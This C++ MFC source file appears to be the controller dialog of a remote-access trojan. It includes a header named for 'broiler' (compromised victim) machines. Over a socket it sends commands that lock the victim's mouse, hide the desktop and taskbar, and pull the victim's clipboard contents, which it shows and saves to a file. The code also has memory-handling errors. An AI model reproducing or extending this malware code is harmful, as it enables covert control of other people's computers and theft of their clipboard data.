// DesktopDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "DesktopDlg.h"
#include "BroilerData.h"

// CDesktopDlg 对话框

IMPLEMENT_DYNAMIC(CDesktopDlg, CDialog)

CDesktopDlg::CDesktopDlg(CWnd* pParent /*=NULL*/, SOCKET sock, CString strTitle)
	: CDialog(CDesktopDlg::IDD, pParent)
{
	m_socket = sock;
	m_pBuffer = NULL;
	m_strTitle = strTitle;
	m_strCilpBoard.Empty();
}

CDesktopDlg::~CDesktopDlg()
{
}

void CDesktopDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CDesktopDlg, CDialog)
	ON_BN_CLICKED(IDC_BTN_HIDE_MOUSE, &CDesktopDlg::OnBnClickedBtnHideMouse)
	ON_BN_CLICKED(IDC_BTN_ALLOW_MOUSE, &CDesktopDlg::OnBnClickedBtnAllowMouse)
	ON_BN_CLICKED(IDC_BTN_HIDE_DESKTOP, &CDesktopDlg::OnBnClickedBtnHideDesktop)
	ON_BN_CLICKED(IDC_BTN_SHOW_DESKTOP, &CDesktopDlg::OnBnClickedBtnShowDesktop)
	ON_BN_CLICKED(IDC_BTN_HIDE_TASKBAR, &CDesktopDlg::OnBnClickedBtnHideTaskbar)
	ON_BN_CLICKED(IDC_BTN_SHOW_TASKBAR, &CDesktopDlg::OnBnClickedBtnShowTaskbar)
	ON_BN_CLICKED(IDC_BTN_VIEW_CLIP, &CDesktopDlg::OnBnClickedBtnViewClip)
	ON_BN_CLICKED(IDC_BTN_SAVE_CLIP, &CDesktopDlg::OnBnClickedBtnSaveClip)
END_MESSAGE_MAP()


// CDesktopDlg 消息处理程序
BOOL CDesktopDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //如果按下的是回车键或ESC键，则截断消息
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CDesktopDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
    SetIcon(AfxGetApp()->LoadIcon(IDI_ICON_DESKTOP), TRUE);
	m_strTitle = _T("\\\\") + m_strTitle;
	m_strTitle += _T(" 桌面管理");
	SetWindowText(m_strTitle);
	// TODO:  在此添加额外的初始化
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CDesktopDlg::OnBnClickedBtnHideMouse()
{
	// TODO: 在此添加控件通知处理程序代码
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = MOUSE_MOVE;
	tagDesktopInfo.bTag = false;  //禁止鼠标移动
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::OnBnClickedBtnAllowMouse()
{
	// TODO: 在此添加控件通知处理程序代码
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = MOUSE_MOVE;
	tagDesktopInfo.bTag = true;  //允许鼠标移动
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::OnBnClickedBtnHideDesktop()
{
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = DESKTOP_ICON;
	tagDesktopInfo.bTag = true;  //隐藏桌面
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::OnBnClickedBtnShowDesktop()
{
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = DESKTOP_ICON;
	tagDesktopInfo.bTag = false;  //显示桌面
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::OnBnClickedBtnHideTaskbar()
{
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = TASKBAR;
	tagDesktopInfo.bTag = true;  //隐藏任务栏
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::OnBnClickedBtnShowTaskbar()
{
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = TASKBAR;
	tagDesktopInfo.bTag = false;  //显示任务栏
	SendCommandMsg(tagDesktopInfo);
}

//查看剪贴板内容
void CDesktopDlg::OnBnClickedBtnViewClip()
{
	// TODO: 在此添加控件通知处理程序代码
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = CLIPBOARD;
	tagDesktopInfo.bTag = true;
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::SendCommandMsg(IN const DESKTOPINFO_C tagDesktopInfo)
{
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_DESKTOP;
	memcpy((char*)tagMsgInfo.context, (char*)&tagDesktopInfo, sizeof(DESKTOPINFO_C));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
}

DWORD CDesktopDlg::SetClipBoardContext(IN const CLIPBOARD_C tagClipBoard)
{
	switch (tagClipBoard.id)
	{
	case 0:   //头信息
		{
			m_pBuffer = new char[tagClipBoard.dwSize + 1];  //申请空间
			memset(m_pBuffer, 0, tagClipBoard.dwSize + 1);
		}
		break;
	case 1:  //正常大小数据块
		{
			//复制数据
			for(int i= tagClipBoard.Begin, j = 0 ; j < AUDIO_BUF_SIZE; i++, j++)
			{
				m_pBuffer[i] = tagClipBoard.Data[j];
			}
		}
		break;
	case 2:  //最后一次复制数据
		{
			for(int i= tagClipBoard.Begin, j=0; i < tagClipBoard.dwSize; i++,j++)
			{
				m_pBuffer[i] = tagClipBoard.Data[j];
			}
		}
		break;
	default:
		{
			MessageBox(_T("未知的剪贴板数据ID"),_T("提示"),MB_OK);
			delete[] m_pBuffer;
			LocalFree(m_pBuffer);
			return 1;
		}
	}
	if (tagClipBoard.bRead)
	{
		CStringA strContent = "";
		strContent.Format("%s", m_pBuffer);
		m_strCilpBoard.Empty();
		m_strCilpBoard = CStrA2CStrW(strContent);
		GetDlgItem(IDC_EDIT_CLIPBOARD)->SetWindowText(m_strCilpBoard);
		delete[] m_pBuffer;
	}
	return 0;
}

void CDesktopDlg::OnBnClickedBtnSaveClip()
{
	CString strFileName = _T("剪切板信息");
	CTime time = CTime::GetCurrentTime();  //以当前时间命名
	CString strTime = time.Format(_T("%Y-%m-%d %H-%M-%S"));
	strFileName += strTime;
	strFileName += _T(".txt");

	CFileDialog cdOpenFile(FALSE,  //定义一个CfileDialog对象
		                   _T(""),
		                   strFileName,
		                   OFN_FILEMUSTEXIST |OFN_HIDEREADONLY,
		                   _T("文件类型(*.txt)|*.txt||"),
		                   NULL);//生成一个对话框

	if(cdOpenFile.DoModal() == IDOK)//假如点击对话框确定按钮
	{
		CString strFilePathName = _T("");
		strFilePathName = cdOpenFile.GetPathName();//得到打开文件的路径
		//保存剪贴板内容到记事本中
		HANDLE hFile = CreateFile(strFilePathName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			::MessageBox(this->m_hWnd, _T("文件保存句柄获取失败!\n"), _T("提示"), MB_ICONWARNING|MB_OK);
		}
		else
		{
			CFile fDestFile(hFile);

			//因为工程环境是Unicode，故在该环境下写入，应该加上文件头，避免乱码。
			unsigned short int feff = 0xfeff;   
			fDestFile.Write(&feff,sizeof(short int));
			//正式写文件，注意这里为什么要 乘以 sizeof(TCHAR)，不乘就会写入不完全！原因还需探究
			try
			{
				fDestFile.Write(m_strCilpBoard.GetBuffer(0), m_strCilpBoard.GetLength() * sizeof(TCHAR));
				::MessageBox(this->m_hWnd, _T("文件保存成功!\n"), _T("提示"), MB_OK);
			}
			catch (CFileException)
			{
				::MessageBox(this->m_hWnd, _T("文件写入失败!\n"), _T("提示"), MB_ICONWARNING|MB_OK);
			}
			fDestFile.Flush();
			fDestFile.Close();  //关闭文件句柄
			m_strCilpBoard.ReleaseBuffer();
		}
	}
}

//
// CStringA转CStringW  Unicode环境下
//
CStringW CDesktopDlg::CStrA2CStrW(const CStringA &cstrSrcA)
{
	int len = MultiByteToWideChar(CP_ACP, 0, LPCSTR(cstrSrcA), -1, NULL, 0);
	wchar_t *wstr = new wchar_t[len];
	memset(wstr, 0, len*sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, LPCSTR(cstrSrcA), -1, wstr, len);
	CStringW cstrDestW = wstr;
	delete[] wstr;
	return cstrDestW;
}

void CDesktopDlg::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	DestroyWindow();
	delete this;
}

void CDesktopDlg::PostNcDestroy()
{
	// TODO: 在此添加专用代码和/或调用基类
	CDialog::PostNcDestroy();
	((CBroilerData*)this->m_pParentWnd)->m_pDesktopDlg = NULL;
}
